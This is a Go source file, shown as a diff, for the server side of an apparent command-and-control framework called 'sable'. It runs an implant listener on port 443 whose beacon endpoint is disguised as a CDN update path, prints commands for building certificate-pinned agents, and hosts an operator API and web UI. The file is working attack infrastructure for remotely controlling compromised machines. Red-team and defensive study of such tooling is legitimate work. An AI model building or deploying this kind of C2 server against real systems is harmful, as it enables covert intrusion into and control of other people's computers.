@@ -1,0 +1,253 @@
+package main
+
+import (
+	"bytes"
+	"crypto/rand"
+	"crypto/tls"
+	"encoding/binary"
+	"encoding/json"
+	"errors"
+	"flag"
+	"fmt"
+	"io"
+	"io/fs"
+	"log"
+	"net"
+	"net/http"
+	"net/url"
+	"os"
+	"strings"
+	"time"
+	"unicode/utf16"
+	"unicode/utf8"
+
+	"github.com/aelder202/sable/internal/api"
+	"github.com/aelder202/sable/internal/cli"
+	"github.com/aelder202/sable/internal/listener"
+	"github.com/aelder202/sable/internal/nonce"
+	"github.com/aelder202/sable/internal/session"
+	webui "github.com/aelder202/sable/web"
+)
+
+func main() {
+	cliMode := flag.Bool("cli", false, "start interactive operator CLI instead of server")
+	apiURL := flag.String("api", "https://127.0.0.1:8443", "operator API URL (for --cli mode)")
+	passwordFile := flag.String("password-file", "", "read operator password from file")
+	flag.Parse()
+
+	password, err := loadOperatorPassword(*passwordFile)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[-] password error: %v\n", err)
+		os.Exit(1)
+	}
+
+	if *cliMode {
+		token := loginCLI(*apiURL, password)
+		c, err := cli.New(*apiURL, token)
+		if err != nil {
+			log.Fatal(err)
+		}
+		c.Run()
+		return
+	}
+
+	// Load or generate the TLS certificate. Persisting it keeps the fingerprint
+	// stable across restarts so agents don't need to be rebuilt.
+	cert, fingerprint, err := listener.LoadOrCreateCert("server.crt", "server.key")
+	if err != nil {
+		log.Fatalf("cert error: %v", err)
+	}
+	fmt.Printf("[*] TLS cert fingerprint (SHA-256): %s\n", fingerprint)
+	fmt.Printf("[*] Build agents with: make build-agent-linux CERT_FP_HEX=%s\n", fingerprint)
+
+	store := session.NewStore()
+	nc := nonce.NewCache(5 * time.Minute)
+
+	tlsCfg := listener.NewTLSConfig(cert)
+
+	// Agent-facing HTTPS listener on :443
+	beaconMux := http.NewServeMux()
+	beaconMux.Handle("/cdn/static/update", listener.NewHTTPSHandler(store, nc))
+	agentSrv := &http.Server{
+		Addr:         ":443",
+		Handler:      beaconMux,
+		TLSConfig:    tlsCfg,
+		ReadTimeout:  10 * time.Second,
+		WriteTimeout: 10 * time.Second,
+	}
+
+	// Operator-facing API on 127.0.0.1:8443 over TLS (loopback-only).
+	// Binding to loopback prevents off-host exposure; TLS protects the JWT and
+	// operator password even on the local machine's network interfaces.
+	apiLn, err := tls.Listen("tcp", "127.0.0.1:8443", tlsCfg)
+	if err != nil {
+		log.Fatalf("operator API listen failed: %v", err)
+	}
+	jwtSecret := generateRandom(32)
+	apiCfg := &api.Config{
+		OperatorPasswordHash: api.HashPassword(password),
+		JWTSecret:            jwtSecret,
+	}
+	fullMux := http.NewServeMux()
+	fullMux.Handle("/api/", api.NewRouter(store, apiCfg))
+	fullMux.Handle("/", serveWebUI())
+	apiSrv := &http.Server{
+		Handler:      api.WithSecurityHeaders(fullMux),
+		ReadTimeout:  10 * time.Second,
+		WriteTimeout: 10 * time.Second,
+	}
+
+	go func() { log.Fatal(apiSrv.Serve(apiLn)) }()
+	log.Printf("[*] Operator API on https://127.0.0.1:8443 | Agent listener on :443")
+	log.Fatal(agentSrv.ListenAndServeTLS("", ""))
+}
+
+// loginCLI authenticates to the operator API and returns the JWT.
+// InsecureSkipVerify is only allowed for loopback API URLs.
+func loginCLI(apiURL, password string) string {
+	if err := requireLoopbackAPIURL(apiURL); err != nil {
+		log.Fatal(err)
+	}
+	client := &http.Client{ //nolint:gosec
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
+		},
+	}
+	body, _ := json.Marshal(map[string]string{"password": password})
+	resp, err := client.Post(apiURL+"/api/auth/login", "application/json", bytes.NewReader(body))
+	if err != nil {
+		log.Fatalf("login failed: %v", err)
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		data, _ := io.ReadAll(resp.Body)
+		log.Fatalf("login rejected: %s", data)
+	}
+	var result map[string]string
+	json.NewDecoder(resp.Body).Decode(&result) //nolint:errcheck
+	if result["token"] == "" {
+		log.Fatal("login failed: no token returned")
+	}
+	return result["token"]
+}
+
+func loadOperatorPassword(passwordFile string) (string, error) {
+	if password := strings.TrimSpace(os.Getenv("SABLE_OPERATOR_PASSWORD")); password != "" {
+		return password, nil
+	}
+	if password := strings.TrimSpace(os.Getenv("C2_OPERATOR_PASSWORD")); password != "" {
+		return password, nil
+	}
+	if passwordFile != "" {
+		data, err := os.ReadFile(passwordFile)
+		if err != nil {
+			return "", fmt.Errorf("read password file: %w", err)
+		}
+		password := normalizePasswordInput(data)
+		if password == "" {
+			return "", errors.New("password file is empty")
+		}
+		return password, nil
+	}
+
+	stat, err := os.Stdin.Stat()
+	if err == nil && stat.Mode()&os.ModeCharDevice == 0 {
+		data, err := io.ReadAll(io.LimitReader(os.Stdin, 4096))
+		if err != nil {
+			return "", fmt.Errorf("read password from stdin: %w", err)
+		}
+		password := normalizePasswordInput(data)
+		if password == "" {
+			return "", errors.New("stdin password is empty")
+		}
+		return password, nil
+	}
+
+	return "", errors.New("supply the operator password via SABLE_OPERATOR_PASSWORD, --password-file, or stdin")
+}
+
+func normalizePasswordInput(data []byte) string {
+	switch {
+	case bytes.HasPrefix(data, []byte{0xEF, 0xBB, 0xBF}):
+		return strings.TrimSpace(string(data[3:]))
+	case bytes.HasPrefix(data, []byte{0xFF, 0xFE}):
+		return strings.TrimSpace(decodeUTF16Bytes(data[2:], binary.LittleEndian))
+	case bytes.HasPrefix(data, []byte{0xFE, 0xFF}):
+		return strings.TrimSpace(decodeUTF16Bytes(data[2:], binary.BigEndian))
+	case utf8.Valid(data):
+		return strings.TrimSpace(string(data))
+	case looksLikeUTF16(data, 1):
+		return strings.TrimSpace(decodeUTF16Bytes(data, binary.LittleEndian))
+	case looksLikeUTF16(data, 0):
+		return strings.TrimSpace(decodeUTF16Bytes(data, binary.BigEndian))
+	default:
+		return strings.TrimSpace(string(data))
+	}
+}
+
+func decodeUTF16Bytes(data []byte, order binary.ByteOrder) string {
+	if len(data)%2 != 0 {
+		data = data[:len(data)-1]
+	}
+	words := make([]uint16, 0, len(data)/2)
+	for i := 0; i+1 < len(data); i += 2 {
+		words = append(words, order.Uint16(data[i:i+2]))
+	}
+	return string(utf16.Decode(words))
+}
+
+func looksLikeUTF16(data []byte, nullByteIndex int) bool {
+	if len(data) < 4 || len(data)%2 != 0 {
+		return false
+	}
+	nulls := 0
+	pairs := 0
+	for i := nullByteIndex; i < len(data); i += 2 {
+		pairs++
+		if data[i] == 0 {
+			nulls++
+		}
+	}
+	return pairs > 0 && nulls*2 >= pairs
+}
+
+func requireLoopbackAPIURL(apiURL string) error {
+	u, err := url.Parse(apiURL)
+	if err != nil {
+		return fmt.Errorf("invalid API URL: %w", err)
+	}
+	host := u.Hostname()
+	if host == "" {
+		return errors.New("API URL must include a hostname")
+	}
+	ip := net.ParseIP(host)
+	if ip != nil && ip.IsLoopback() {
+		return nil
+	}
+	switch strings.ToLower(host) {
+	case "localhost":
+		return nil
+	default:
+		return fmt.Errorf("refusing insecure CLI TLS for non-loopback API host %q", host)
+	}
+}
+
+func generateRandom(n int) []byte {
+	b := make([]byte, n)
+	if _, err := rand.Read(b); err != nil {
+		log.Fatalf("failed to generate random bytes: %v", err)
+	}
+	return b
+}
+
+func serveWebUI() http.Handler {
+	sub, err := fs.Sub(webui.FS, ".")
+	if err != nil {
+		log.Fatalf("web UI embed error: %v", err)
+	}
+	fileServer := http.FileServer(http.FS(sub))
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Cache-Control", "no-store")
+		fileServer.ServeHTTP(w, r)
+	})
+}
